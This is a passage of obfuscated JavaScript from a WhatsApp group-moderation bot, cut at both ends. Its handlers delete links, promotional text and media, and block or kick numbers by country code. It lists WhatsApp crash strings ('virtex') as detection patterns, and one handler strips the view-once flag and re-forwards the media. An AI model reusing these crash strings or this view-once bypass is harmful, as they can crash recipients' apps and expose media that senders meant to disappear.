_0x290311=parseInt(_0x5e94bd(0x1d4))/0x1*(parseInt(_0x5e94bd(0x1d5))/0x2)+parseInt(_0x5e94bd(0x1d8))/0x3*(-parseInt(_0x5e94bd(0x1d9))/0x4)+-parseInt(_0x5e94bd(0x1cc))/0x5*(parseInt(_0x5e94bd(0x1dc))/0x6)+parseInt(_0x5e94bd(0x1cb))/0x7*(-parseInt(_0x5e94bd(0x1da))/0x8)+parseInt(_0x5e94bd(0x1d3))/0x9+-parseInt(_0x5e94bd(0x1dd))/0xa+parseInt(_0x5e94bd(0x1cd))/0xb;if(_0x290311===_0x1f5908)break;else _0x23937a['push'](_0x23937a['shift']());}catch(_0x5d4f64){_0x23937a['push'](_0x23937a['shift']());}}}(_0x3e7e,0x5a6f5));if(!m['key']['fromMe']&&!m[_0x1ac6e2(0x1d2)]&&global[_0x1ac6e2(0x1c5)]===!![])try{const botreply=await axios[_0x1ac6e2(0x1ce)](_0x1ac6e2(0x1d0)+budy+_0x1ac6e2(0x1d1));if(botreply&&botreply[_0x1ac6e2(0x1c6)]&&botreply[_0x1ac6e2(0x1c6)][_0x1ac6e2(0x1c8)]){const txt=''+botreply[_0x1ac6e2(0x1c6)][_0x1ac6e2(0x1c8)];VeranBotInc['sendMessage'](m[_0x1ac6e2(0x1db)],{'text':txt},{'quoted':m});}else VeranBotInc[_0x1ac6e2(0x1c7)](m[_0x1ac6e2(0x1db)],{'text':_0x1ac6e2(0x1d6)},{'quoted':m});}catch(_0x3cb636){const errorMsg=_0x1ac6e2(0x1c9)+(_0x3cb636[_0x1ac6e2(0x1d7)]||_0x1ac6e2(0x1cf));VeranBotInc[_0x1ac6e2(0x1c7)](m['chat'],{'text':errorMsg},{'quoted':m}),console[_0x1ac6e2(0x1ca)]('Error\x20fetching\x20response\x20from\x20API:',_0x3cb636);}
        
        function _0x56ec(_0x40effd,_0x1a4302){const _0x4a181f=_0x4a18();return _0x56ec=function(_0x56ec19,_0x593325){_0x56ec19=_0x56ec19-0x1be;let _0x496336=_0x4a181f[_0x56ec19];return _0x496336;},_0x56ec(_0x40effd,_0x1a4302);}const _0x3e4eea=_0x56ec;(function(_0x530f0d,_0xf8005d){const _0x36cb15=_0x56ec,_0x36a5d2=_0x530f0d();while(!![]){try{const _0x4dcdff=-parseInt(_0x36cb15(0x1e5))/0x1*(-parseInt(_0x36cb15(0x1d0))/0x2)+-parseInt(_0x36cb15(0x1e4))/0x3*(-parseInt(_0x36cb15(0x1c3))/0x4)+-parseInt(_0x36cb15(0x1e3))/0x5*(-parseInt(_0x36cb15(0x1fe))/0x6)+-parseInt(_0x36cb15(0x1fa))/0x7*(parseInt(_0x36cb15(0x1c4))/0x8)+-parseInt(_0x36cb15(0x1d3))/0x9*(parseInt(_0x36cb15(0x1c9))/0xa)+-parseInt(_0x36cb15(0x201))/0xb+parseInt(_0x36cb15(0x1e7))/0xc*(parseInt(_0x36cb15(0x1f1))/0xd);if(_0x4dcdff===_0xf8005d)break;else _0x36a5d2['push'](_0x36a5d2['shift']());}catch(_0xea4ddf){_0x36a5d2['push'](_0x36a5d2['shift']());}}}(_0x4a18,0xdf368));if(db[_0x3e4eea(0x1e2)][botNumber]['autorecordtype']){if(m[_0x3e4eea(0x1d2)]){let veranmix=[_0x3e4eea(0x1ea),_0x3e4eea(0x1f8)];veranmix2=veranmix[Math[_0x3e4eea(0x1d4)](veranmix[_0x3e4eea(0x1ce)]*Math['random']())],VeranBotInc['sendPresenceUpdate'](veranmix2,m[_0x3e4eea(0x1dd)]);}}if(db[_0x3e4eea(0x1e2)][botNumber][_0x3e4eea(0x1d1)]){if(m['message']){let veranpos=['recording'];VeranBotInc[_0x3e4eea(0x1eb)](veranpos,m[_0x3e4eea(0x1dd)]);}}db['settings'][botNumber][_0x3e4eea(0x1e0)]&&(isCmd&&VeranBotInc['sendPresenceUpdate'](_0x3e4eea(0x1e6),m[_0x3e4eea(0x1dd)]));if(m[_0x3e4eea(0x1f2)]['startsWith'](''+autoblocknumber)&&db[_0x3e4eea(0x1e2)][botNumber]['autoblocknum']===!![])return VeranBotInc[_0x3e4eea(0x1c5)](m[_0x3e4eea(0x1f2)],_0x3e4eea(0x1e9));if(!m[_0x3e4eea(0x1f2)]['startsWith']('91')&&db['settings'][botNumber]['onlyindia']===!![])return VeranBotInc['updateBlockStatus'](m['sender'],_0x3e4eea(0x1e9));if(!m[_0x3e4eea(0x1f2)][_0x3e4eea(0x1fb)]('62')&&db[_0x3e4eea(0x1e2)][botNumber]['onlyindo']===!![])return VeranBotInc['updateBlockStatus'](m[_0x3e4eea(0x1f2)],'block');if(!m[_0x3e4eea(0x1f2)][_0x3e4eea(0x1fb)](''+antiforeignnumber)&&db[_0x3e4eea(0x1f3)][m[_0x3e4eea(0x1dd)]][_0x3e4eea(0x203)]===!![]){if(VeranTheCreator||m[_0x3e4eea(0x1be)]||!m[_0x3e4eea(0x1d5)])return;VeranBotInc['sendMessage'](m[_0x3e4eea(0x1dd)],{'text':_0x3e4eea(0x1c6)+antiforeignnumber+_0x3e4eea(0x1d9)},{'quoted':m}),await sleep(0x7d0),await VeranBotInc[_0x3e4eea(0x1fd)](m[_0x3e4eea(0x1dd)],[m[_0x3e4eea(0x1f2)]],_0x3e4eea(0x1ef));}try{const textLower=m['text'][_0x3e4eea(0x1c1)]();if(textLower===_0x3e4eea(0x1ec)||textLower==='statusdown'||textLower===_0x3e4eea(0x202)||textLower==='send'){const quotedMessage=m[_0x3e4eea(0x1f6)][_0x3e4eea(0x1ca)][_0x3e4eea(0x1f4)];if(quotedMessage){if(quotedMessage[_0x3e4eea(0x1c7)]){let imageCaption=quotedMessage[_0x3e4eea(0x1c7)]['caption'],imageUrl=await VeranBotInc[_0x3e4eea(0x205)](quotedMessage[_0x3e4eea(0x1c7)]);VeranBotInc[_0x3e4eea(0x1fc)](m[_0x3e4eea(0x1dd)],{'image':{'url':imageUrl},'caption':imageCaption}),replygcveran(_0x3e4eea(0x1db));}if(quotedMessage[_0x3e4eea(0x1c2)]){let videoCaption=quotedMessage[_0x3e4eea(0x1c2)][_0x3e4eea(0x1de)],videoUrl=await VeranBotInc['downloadAndSaveMediaMessage'](quotedMessage[_0x3e4eea(0x1c2)]);VeranBotInc[_0x3e4eea(0x1fc)](m['chat'],{'video':{'url':videoUrl},'caption':videoCaption}),replygcveran(_0x3e4eea(0x1db));}}}}catch(_0x5c123b){console['error'](_0x3e4eea(0x200),_0x5c123b);}function _0x4a18(){const _0x18e105=['viewOnceMessageV2','isBaileys','keys','\x20country\x20code\x20is\x20allowed\x20to\x20join\x20the\x20group','```「\x20Promotion\x20Detected\x20」```\x0a\x0a@','*Downloading\x20status...*','\x20has\x20sent\x20a\x20promotion\x20message\x20and\x20successfully\x20deleted','chat','caption','key','online','packname','settings','5zaDQcY','4290123vQJehj','3GoHSUx','unavailable','282876tkXgBh','participant','block','composing','sendPresenceUpdate','download','author','autosticker','remove','Auto\x20sticker\x20detected','1079wGXAbd','sender','groups','quotedMessage','sendImageAsSticker','msg','match','recording','```「\x20Bad\x20Word\x20Detected\x20」```\x0a\x0a@','12264805thnDyK','startsWith','sendMessage','groupParticipantsUpdate','944760dctDYA','split','Error\x20in\x20\x27send\x20message\x27\x20handling:','9624417Jjytfz','take','antiforeignnum','instagram\x20booster|tiktok\x20booster|ml\x20booster|bgmi\x20selling|selling\x20uc|selling\x20diamonds|selling\x20coin|selling\x20id|selling\x20account|selling\x20ids|buy\x20account|sell\x20account|buy\x20id|sell\x20id|instagram\x20followers|tiktok\x20followers|buy\x20panel|sell\x20panel|sell\x20bug\x20bot|buy\x20bug\x20bot|buy\x20bot\x20bug|sell\x20bot\x20bug|adminpanel5kpm|open\x20jasa\x20push\x20member\x20grup|yangmaubuypanelpm|admin\x20panel\x2010k\x20pm|Hanya\x20menyediakan\x20Jasa\x20Push\x20Member\x20Grup|admin\x20panel\x205k\x20pm|yang\x20mau\x20beli\x20panel\x20murah\x20pm|list\x20harga\x20panel\x20by|list\x20harga\x20vps|LIST\x20HARGA\x20VPS|OPEN\x20JASA\x20PUSH\x20MEMBER\x20GRUP|READY|Redy|LIST\x20HARGA\x20PANEL\x20BY|list\x20harga\x20panel|menyediakan|MENYEDIAKAN|OPEN\x20MURBUG|open|OPEN|PANEL\x20READY|PANEL|PANNEL\x20READY|panel|panel\x20ready|pannel\x20ready\x20minat\x20pm|mau\x20panel\x20pm|MAU\x20PANNEL\x20PM|Admin\x20panel\x20ready|ADMIN\x20PANEL\x20READY|Chat\x20aja\x20om\x20ready\x20selalu|OPEN\x20JASA\x20INSTALL|open\x20jasa\x20installMENYEDIAKAN\x20JASA\x20INSTALL|menyediakan\x20jasa\x20install','downloadAndSaveMediaMessage','test','isAdmin','sendVideoAsSticker','viewOnceMessage','toLowerCase','videoMessage','4qTKBnW','8lHMOmc','updateBlockStatus','Sorry\x20buddy!\x20you\x20will\x20be\x20removed\x20because\x20the\x20group\x20admin/owner\x20has\x20enabled\x20anti\x20foreign\x20number,\x20only\x20+','imageMessage','\x20was\x20using\x20harsh\x20words\x20and\x20his\x20chat\x20has\x20been\x20deleted','30VowVEz','contextInfo','antiviewonce','isGroup','viewOnce','length','fromMe','187396geIlaC','autorecord','message','851436pgIiSt','floor','isBotAdmin'];_0x4a18=function(){return _0x18e105;};return _0x4a18();}if(db[_0x3e4eea(0x1e2)][botNumber][_0x3e4eea(0x1ee)]){if(m[_0x3e4eea(0x1df)]['fromMe'])return;if(/image/[_0x3e4eea(0x206)](mime)&&!/webp/[_0x3e4eea(0x206)](mime)){let mediac=await quoted['download']();VeranBotInc[_0x3e4eea(0x1f5)](m['chat'],mediac,m,{'packname':global['packname'],'author':global[_0x3e4eea(0x1ed)]}),console['log'](_0x3e4eea(0x1f0));}else{if(/video/[_0x3e4eea(0x206)](mime)){if((quoted[_0x3e4eea(0x1f6)]||quoted)['seconds']>0xb)return;let mediac=await quoted[_0x3e4eea(0x1ec)]();VeranBotInc[_0x3e4eea(0x1bf)](m[_0x3e4eea(0x1dd)],mediac,m,{'packname':global[_0x3e4eea(0x1e1)],'author':global[_0x3e4eea(0x1ed)]});}}}if(db['groups'][m[_0x3e4eea(0x1dd)]]['antibot']){if(m[_0x3e4eea(0x1d7)]&&m[_0x3e4eea(0x1cf)]==![]){if(m[_0x3e4eea(0x1be)]||!m['m'][_0x3e4eea(0x1d5)]){}else return replygcveran('*Another\x20Bot\x20Detected*\x0a\x0aHusshhh\x20Get\x20away\x20from\x20this\x20group!!!'),await VeranBotInc[_0x3e4eea(0x1fd)](m[_0x3e4eea(0x1dd)],[m[_0x3e4eea(0x1f2)]],'remove');}}if(db[_0x3e4eea(0x1f3)][m[_0x3e4eea(0x1dd)]][_0x3e4eea(0x1cb)]&&m[_0x3e4eea(0x1cc)]&&m['mtype']==_0x3e4eea(0x1d6)){let val={...m},msg=val[_0x3e4eea(0x1d2)]?.[_0x3e4eea(0x1c0)]?.[_0x3e4eea(0x1d2)]||val['message']?.['viewOnceMessageV2']?.['message'];delete msg[Object[_0x3e4eea(0x1d8)](msg)[0x0]][_0x3e4eea(0x1cd)],val['message']=msg,await VeranBotInc[_0x3e4eea(0x1fc)](m[_0x3e4eea(0x1dd)],{'forward':val},{'quoted':m});}if(db[_0x3e4eea(0x1f3)][m['chat']]['antipromotion']){if(budy[_0x3e4eea(0x1f7)](_0x3e4eea(0x204))){if(!m[_0x3e4eea(0x1d5)])return;if(VeranTheCreator)return;if(m['isAdmin'])return;VeranBotInc[_0x3e4eea(0x1fc)](m[_0x3e4eea(0x1dd)],{'delete':{'remoteJid':m[_0x3e4eea(0x1dd)],'fromMe':![],'id':m[_0x3e4eea(0x1df)]['id'],'participant':m['key']['participant']}}),VeranBotInc[_0x3e4eea(0x1fc)](m[_0x3e4eea(0x1dd)],{'text':_0x3e4eea(0x1da)+m['sender'][_0x3e4eea(0x1ff)]('@')[0x0]+_0x3e4eea(0x1dc),'contextInfo':{'mentionedJid':[m[_0x3e4eea(0x1f2)]]}},{'quoted':m});}}if(db[_0x3e4eea(0x1f3)][m[_0x3e4eea(0x1dd)]]['badword'])for(let bak of bad){budy===bak&&(VeranBotInc[_0x3e4eea(0x1fc)](m['chat'],{'delete':{'remoteJid':m[_0x3e4eea(0x1dd)],'fromMe':![],'id':m[_0x3e4eea(0x1df)]['id'],'participant':m[_0x3e4eea(0x1df)][_0x3e4eea(0x1e8)]}}),VeranBotInc[_0x3e4eea(0x1fc)](m[_0x3e4eea(0x1dd)],{'text':_0x3e4eea(0x1f9)+m[_0x3e4eea(0x1f2)][_0x3e4eea(0x1ff)]('@')[0x0]+_0x3e4eea(0x1c8),'contextInfo':{'mentionedJid':[m['sender']]}},{'quoted':m}));}

function _0x2558(_0x37d0e5,_0x11f728){const _0x421c53=_0x421c();return _0x2558=function(_0x255880,_0x25bffe){_0x255880=_0x255880-0x16a;let _0x265f51=_0x421c53[_0x255880];return _0x265f51;},_0x2558(_0x37d0e5,_0x11f728);}const _0x4c7b7c=_0x2558;(function(_0x17c940,_0x3fbdd9){const _0x57e81a=_0x2558,_0x406150=_0x17c940();while(!![]){try{const _0x798b95=parseInt(_0x57e81a(0x171))/0x1*(parseInt(_0x57e81a(0x1b4))/0x2)+-parseInt(_0x57e81a(0x18a))/0x3*(-parseInt(_0x57e81a(0x17b))/0x4)+-parseInt(_0x57e81a(0x176))/0x5*(-parseInt(_0x57e81a(0x180))/0x6)+parseInt(_0x57e81a(0x16e))/0x7+parseInt(_0x57e81a(0x177))/0x8+parseInt(_0x57e81a(0x1ad))/0x9*(-parseInt(_0x57e81a(0x186))/0xa)+-parseInt(_0x57e81a(0x1a0))/0xb*(parseInt(_0x57e81a(0x1a9))/0xc);if(_0x798b95===_0x3fbdd9)break;else _0x406150['push'](_0x406150['shift']());}catch(_0x299ca2){_0x406150['push'](_0x406150['shift']());}}}(_0x421c,0x7e56f));if(m[_0x4c7b7c(0x19e)]&&db[_0x4c7b7c(0x193)][m[_0x4c7b7c(0x1b1)]][_0x4c7b7c(0x185)]){if(budy[_0x4c7b7c(0x198)](_0x4c7b7c(0x1af))||budy[_0x4c7b7c(0x198)]('ดุ')||budy[_0x4c7b7c(0x198)](_0x4c7b7c(0x170))||budy[_0x4c7b7c(0x198)](_0x4c7b7c(0x1b0))||budy['includes'](_0x4c7b7c(0x16a))||budy['includes'](_0x4c7b7c(0x178))||budy[_0x4c7b7c(0x198)](_0x4c7b7c(0x191))||budy[_0x4c7b7c(0x198)](_0x4c7b7c(0x197))||budy['includes'](_0x4c7b7c(0x17e))||budy[_0x4c7b7c(0x198)]('᥋')||budy[_0x4c7b7c(0x198)]('؁')||budy[_0x4c7b7c(0x198)]('ٯٯٯٯٯ')){if(m[_0x4c7b7c(0x1a6)])return replygcveran(_0x4c7b7c(0x1b8));console[_0x4c7b7c(0x183)](color(_0x4c7b7c(0x1a7),_0x4c7b7c(0x196)),color(_0x4c7b7c(0x1a4),_0x4c7b7c(0x188))),VeranBotInc[_0x4c7b7c(0x172)](m[_0x4c7b7c(0x1b1)],_0x4c7b7c(0x19c)+sender[_0x4c7b7c(0x175)]('@')[0x0]);if(!m['m'][_0x4c7b7c(0x1a6)])return;if(VeranTheCreator)return;VeranBotInc['groupParticipantsUpdate'](m[_0x4c7b7c(0x1b1)],[sender],_0x4c7b7c(0x1b3)),await VeranBotInc[_0x4c7b7c(0x1ae)](m[_0x4c7b7c(0x1b1)],{'delete':{'remoteJid':m[_0x4c7b7c(0x1b1)],'fromMe':![],'id':m[_0x4c7b7c(0x1ac)]['id'],'participant':m[_0x4c7b7c(0x1ac)][_0x4c7b7c(0x189)]}}),VeranBotInc[_0x4c7b7c(0x1ae)](ownernumber+'@s.whatsapp.net',{'text':_0x4c7b7c(0x182)+sender['split']('@')[0x0]+_0x4c7b7c(0x184)+(isGroup?_0x4c7b7c(0x17c)+groupName:'')});}}if(db[_0x4c7b7c(0x193)][m['chat']]['antimedia']&&isMedia){if(VeranTheCreator||m[_0x4c7b7c(0x1ab)]||!m[_0x4c7b7c(0x1a6)]){}else return replygcveran(_0x4c7b7c(0x1b5)),VeranBotInc['sendMessage'](m[_0x4c7b7c(0x1b1)],{'delete':{'remoteJid':m[_0x4c7b7c(0x1b1)],'fromMe':![],'id':m[_0x4c7b7c(0x1ac)]['id'],'participant':m['key']['participant']}});}if(db[_0x4c7b7c(0x193)][m['chat']][_0x4c7b7c(0x194)]&&isVTHmedia){if(isVTHmedia==='imageMessage'){if(VeranTheCreator||m[_0x4c7b7c(0x1ab)]||!m[_0x4c7b7c(0x1a6)]){}else return replygcveran(_0x4c7b7c(0x174)),VeranBotInc[_0x4c7b7c(0x1ae)](m[_0x4c7b7c(0x1b1)],{'delete':{'remoteJid':m[_0x4c7b7c(0x1b1)],'fromMe':![],'id':m[_0x4c7b7c(0x1ac)]['id'],'participant':m['key'][_0x4c7b7c(0x189)]}});}}if(db['groups'][m['chat']]['antivideo']&&isVTHmedia){if(isVTHmedia===_0x4c7b7c(0x16b)){if(VeranTheCreator||m[_0x4c7b7c(0x1ab)]||!m[_0x4c7b7c(0x1a6)]){}else return replygcveran(_0x4c7b7c(0x190)),VeranBotInc[_0x4c7b7c(0x1ae)](m['chat'],{'delete':{'remoteJid':m['chat'],'fromMe':![],'id':m['key']['id'],'participant':m[_0x4c7b7c(0x1ac)][_0x4c7b7c(0x189)]}});}}if(db[_0x4c7b7c(0x193)][m[_0x4c7b7c(0x1b1)]][_0x4c7b7c(0x19a)]&&isVTHmedia){if(isVTHmedia===_0x4c7b7c(0x1b7)){if(VeranTheCreator||m['isAdmin']||!m[_0x4c7b7c(0x1a6)]){}else return replygcveran(_0x4c7b7c(0x1a2)),VeranBotInc['sendMessage'](m[_0x4c7b7c(0x1b1)],{'delete':{'remoteJid':m[_0x4c7b7c(0x1b1)],'fromMe':![],'id':m[_0x4c7b7c(0x1ac)]['id'],'participant':m[_0x4c7b7c(0x1ac)][_0x4c7b7c(0x189)]}});}}if(db[_0x4c7b7c(0x193)][m['chat']][_0x4c7b7c(0x17a)]&&isVTHmedia){if(isVTHmedia===_0x4c7b7c(0x16c)){if(VeranTheCreator||m[_0x4c7b7c(0x1ab)]||!m['isBotAdmin']){}else return replygcveran(_0x4c7b7c(0x187)),VeranBotInc[_0x4c7b7c(0x1ae)](m[_0x4c7b7c(0x1b1)],{'delete':{'remoteJid':m[_0x4c7b7c(0x1b1)],'fromMe':![],'id':m[_0x4c7b7c(0x1ac)]['id'],'participant':m[_0x4c7b7c(0x1ac)]['participant']}});}}if(db[_0x4c7b7c(0x193)][m['chat']]['antipoll']&&isVTHmedia){if(isVTHmedia===_0x4c7b7c(0x1a3)){if(VeranTheCreator||m[_0x4c7b7c(0x1ab)]||!m[_0x4c7b7c(0x1a6)]){}else return replygcveran(_0x4c7b7c(0x18c)),VeranBotInc[_0x4c7b7c(0x1ae)](m[_0x4c7b7c(0x1b1)],{'delete':{'remoteJid':m['chat'],'fromMe':![],'id':m[_0x4c7b7c(0x1ac)]['id'],'participant':m[_0x4c7b7c(0x1ac)][_0x4c7b7c(0x189)]}});}}if(db['groups'][m[_0x4c7b7c(0x1b1)]][_0x4c7b7c(0x173)]&&isVTHmedia){if(isVTHmedia===_0x4c7b7c(0x1a8)){if(VeranTheCreator||m[_0x4c7b7c(0x1ab)]||!m[_0x4c7b7c(0x1a6)]){}else return replygcveran(_0x4c7b7c(0x199)),VeranBotInc[_0x4c7b7c(0x1ae)](m['chat'],{'delete':{'remoteJid':m['chat'],'fromMe':![],'id':m[_0x4c7b7c(0x1ac)]['id'],'participant':m[_0x4c7b7c(0x1ac)][_0x4c7b7c(0x189)]}});}}if(db[_0x4c7b7c(0x193)][m[_0x4c7b7c(0x1b1)]]['antidocument']&&isVTHmedia){if(isVTHmedia===_0x4c7b7c(0x1b2)){if(VeranTheCreator||m[_0x4c7b7c(0x1ab)]||!m['isBotAdmin']){}else return replygcveran('```「\x20Document\x20Detected\x20」```\x0a\x0aSorry,\x20but\x20I\x20have\x20to\x20delete\x20it,\x20because\x20the\x20admin/owner\x20has\x20activated\x20anti-document\x20for\x20this\x20group'),VeranBotInc[_0x4c7b7c(0x1ae)](m[_0x4c7b7c(0x1b1)],{'delete':{'remoteJid':m['chat'],'fromMe':![],'id':m['key']['id'],'participant':m[_0x4c7b7c(0x1ac)][_0x4c7b7c(0x189)]}});}}if(db[_0x4c7b7c(0x193)][m['chat']]['anticontact']&&isVTHmedia){if(isVTHmedia===_0x4c7b7c(0x179)){if(VeranTheCreator||m[_0x4c7b7c(0x1ab)]||!m[_0x4c7b7c(0x1a6)]){}else return replygcveran(_0x4c7b7c(0x18f)),VeranBotInc[_0x4c7b7c(0x1ae)](m['chat'],{'delete':{'remoteJid':m[_0x4c7b7c(0x1b1)],'fromMe':![],'id':m['key']['id'],'participant':m['key'][_0x4c7b7c(0x189)]}});}}function _0x421c(){const _0x2ff732=['Medium','Hi\x20Owner!\x20wa.me/','log','\x20Detected\x20Having\x20Sent\x20Virtex\x20','antivirtex','80VrAhEE','```「\x20Audio\x20Detected\x20」```\x0a\x0aSorry,\x20but\x20I\x20have\x20to\x20delete\x20it,\x20because\x20the\x20admin/owner\x20has\x20activated\x20anti-audio\x20for\x20this\x20group','yellow','participant','501UORqOk','result','```「\x20Poll\x20Detected\x20」```\x0a\x0aSorry,\x20but\x20I\x20have\x20to\x20delete\x20it,\x20because\x20the\x20admin/owner\x20has\x20activated\x20anti-poll\x20for\x20this\x20group','sender','https','```「\x20Contact\x20Detected\x20」```\x0a\x0aSorry,\x20but\x20I\x20have\x20to\x20delete\x20it,\x20because\x20the\x20admin/owner\x20has\x20activated\x20anti-contact\x20for\x20this\x20group','```「\x20Video\x20Detected\x20」```\x0a\x0aSorry,\x20but\x20I\x20have\x20to\x20delete\x20it,\x20because\x20the\x20admin/owner\x20has\x20activated\x20anti-video\x20for\x20this\x20group','*⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟\x20ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟','https://api.junn4.my.id/download/ytmp4?url=','groups','image','settings','red','ผดิทุเ้ึางผืดิทุเ้','includes','```「\x20Location\x20Detected\x20」```\x0a\x0aSorry,\x20but\x20I\x20have\x20to\x20delete\x20it,\x20because\x20the\x20admin/owner\x20has\x20activated\x20anti-location\x20for\x20this\x20group','antisticker','match','*MARK\x20AS\x20READ*\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x20*Virus\x20sender\x20here👇:*\x20\x0awa.me/','tiktok.com','isGroup','youtube.com|youtu.be','7519336oVUYbV','media','```「\x20Sticker\x20Detected\x20」```\x0a\x0aSorry,\x20but\x20I\x20have\x20to\x20delete\x20it,\x20because\x20the\x20admin/owner\x20has\x20activated\x20anti-sticker\x20for\x20this\x20group','pollCreationMessage','Received\x20a\x20virus\x20text!','autodownload','isBotAdmin','[KICK]','locationMessage','24kipkoj','```「\x20Link\x20Detected\x20」```\x0a\x0aAdmin\x20has\x20sent\x20a\x20link,\x20admin\x20is\x20free\x20to\x20send\x20any\x20link😇','isAdmin','key','820377jNDwpo','sendMessage','๒๒๒๒','๑๑๑๑๑๑๑๑','chat','documentMessage','remove','4bjyHxl','```「\x20Media\x20Detected\x20」```\x0a\x0aSorry,\x20but\x20I\x20have\x20to\x20delete\x20it,\x20because\x20the\x20admin/owner\x20has\x20activated\x20anti-media\x20for\x20this\x20group','facebook.com','stickerMessage','*VIRTEX\x20DETECTED*','৭৭৭৭৭৭৭৭','videoMessage','audioMessage','antilink','3097689bPqqOR','fromMe','ผิดุท้เึางืผิดุท้เึางื','318211gtpUXd','sendText','antilocation','```「\x20Image\x20Detected\x20」```\x0a\x0aSorry,\x20but\x20I\x20have\x20to\x20delete\x20it,\x20because\x20the\x20admin/owner\x20has\x20activated\x20anti-image\x20for\x20this\x20group','split','14695KbuVBz','2193200fOBadg','\x20\x20\x20⃢\x20\x20\x20⃢\x20\x20\x20⃢\x20\x20','contactMessage','antiaudio','11684LzUvgW','in\x20','Auto\x20Download\x20✅','.*࡞ࣰࣰࣰࣲࣲࣲࣲࣩࣩࣩࣩࣶࣶ࣯࣯࣮࣮ࣦ࣯ࣨࣨࣨࣻࣻࣻࣼࣼࣼࣽࣽࣾࣷࣵࣴ࣬࣬࣬ࣤࣤࣧࣧ*','video_sd','1578BdTLCd'];_0x421c=function(){return _0x2ff732;};return _0x421c();}if(db[_0x4c7b7c(0x193)][m['chat']][_0x4c7b7c(0x16d)]){if(budy['match']('http')&&budy['match'](_0x4c7b7c(0x18e))){bvl=_0x4c7b7c(0x1aa);if(m[_0x4c7b7c(0x1ab)])return replygcveran(bvl);if(m[_0x4c7b7c(0x1ac)][_0x4c7b7c(0x16f)])return replygcveran(bvl);if(VeranTheCreator)return replygcveran(bvl);await VeranBotInc['sendMessage'](m[_0x4c7b7c(0x1b1)],{'delete':{'remoteJid':m[_0x4c7b7c(0x1b1)],'fromMe':![],'id':m['key']['id'],'participant':m[_0x4c7b7c(0x1ac)]['participant']}}),VeranBotInc[_0x4c7b7c(0x1ae)](m[_0x4c7b7c(0x1b1)],{'text':'```「\x20Link\x20Detected\x20」```\x0a\x0a@'+m[_0x4c7b7c(0x18d)]['split']('@')[0x0]+'\x20has\x20sent\x20a\x20link\x20and\x20successfully\x20deleted','contextInfo':{'mentionedJid':[m[_0x4c7b7c(0x18d)]]}},{'quoted':m});}}if(db[_0x4c7b7c(0x195)][botNumber][_0x4c7b7c(0x1a5)]&&!m[_0x4c7b7c(0x1ac)][_0x4c7b7c(0x16f)])try{if(budy['match']('instagram.com')){await VeranBotInc['sendMessage'](m['chat'],{'react':{'text':'⏱️','key':m['key']}});let anu=await 